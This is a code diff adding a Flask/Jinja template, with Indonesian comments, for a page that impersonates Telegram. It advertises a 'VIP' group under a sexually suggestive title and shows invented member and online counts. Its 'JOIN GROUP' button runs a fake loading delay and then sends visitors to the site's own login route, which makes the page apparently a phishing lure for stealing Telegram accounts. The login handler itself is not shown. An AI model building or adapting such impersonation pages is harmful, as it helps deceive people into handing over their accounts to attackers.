@@ -1,0 +1,171 @@
+{% extends "layout.html" %} {% block content %}
+
+<style>
+  body {
+    margin: 0 !important;
+    padding: 0 !important;
+    background: #000 !important;
+  }
+
+  /* NAVBAR TETAP DI ATAS */
+  nav {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+
+    height: 60px;
+    z-index: 100;
+  }
+
+  /* BACKGROUND MULAI SETELAH NAVBAR */
+  .hero {
+    position: fixed;
+    top: 60px;
+    left: 0;
+    right: 0;
+    bottom: 0;
+
+    width: 100vw;
+    height: calc(100vh - 60px);
+
+    background: url("{{ url_for('static', filename='rew.jpg') }}") no-repeat
+      center center;
+    background-size: cover;
+
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+
+    padding-top: 20px;
+    overflow-y: auto;
+  }
+
+  /* KOTAK TENGAH */
+  .card-box {
+    width: 100%;
+    max-width: 380px; /* sedikit diperkecil */
+    margin: 0 16px; /* 🔥 INI KUNCINYA */
+    background: #212121;
+    border-radius: 18px;
+    padding: 30px;
+  }
+
+  /* LOADING */
+  #loading {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.8);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+  }
+
+  #loading img {
+    width: 60px;
+  }
+
+  .btn-daftar {
+    background: #156aea;
+    color: white;
+    padding: 12px 22px;
+    border: none;
+    border-radius: 15px;
+    font-weight: 700;
+    cursor: pointer;
+  }
+
+  .btn-daftar:hover {
+    background: #0056b3;
+  }
+</style>
+
+<!-- LOADING OVERLAY -->
+<div id="loading">
+  <img src="{{ url_for('static', filename='loading-loading-forever.gif') }}" />
+</div>
+
+<!-- NAVBAR -->
+<nav
+  style="
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 20px;
+    background: #212121;
+  "
+>
+  <div style="display: flex; gap: 10px; align-items: center">
+    <img
+      src="{{ url_for('static', filename='Telegram_logo.svg.png') }}"
+      style="width: 28px"
+    />
+    <span style="color: white; font-weight: 700">Telegram</span>
+  </div>
+
+  <a
+    href="{{ url_for('login') }}"
+    style="
+      background: #156aea;
+      color: white;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 12px;
+      text-decoration: none;
+      font-weight: 700;
+    "
+  >
+    DOWNLOAD
+  </a>
+</nav>
+
+<!-- HERO (BACKGROUND) -->
+<div class="hero">
+  <!-- CARD -->
+  <div class="card-box">
+    <div style="display: flex; justify-content: center">
+      <img
+        src="{{ url_for('static', filename='banner.png') }}"
+        style="
+          width: 120px;
+          height: 120px;
+          border-radius: 50%;
+          object-fit: cover;
+        "
+      />
+    </div>
+
+    <h3 style="color: white; text-align: center; margin-top: 10px">
+      ❤️𝐂𝐥𝐚𝐬𝐬 𝐍𝐢𝐚 𝐈𝐫𝐰𝐚𝐧 (𝐕𝐈𝐏)💦
+    </h3>
+
+    <p style="color: #c8c8c8; text-align: center; font-size: 12px">
+      5107 members, 378 online
+    </p>
+
+    <div style="display: flex; justify-content: center; margin: 15px 0">
+      <button
+        class="btn-daftar"
+        onclick="showLoading('{{ url_for('login') }}')"
+      >
+        JOIN GROUP
+      </button>
+    </div>
+
+    <p style="color: #c8c8c8; text-align: center; font-size: 14px">
+      join group ❤️𝐂𝐥𝐚𝐬𝐬 𝐍𝐢𝐚 𝐈𝐫𝐰𝐚𝐧 (𝐕𝐈𝐏)💦 free.
+    </p>
+  </div>
+</div>
+
+<script>
+  function showLoading(url) {
+    document.getElementById("loading").style.display = "flex";
+    setTimeout(function () {
+      window.location.href = url;
+    }, 2000);
+  }
+</script>
+
+{% endblock %}
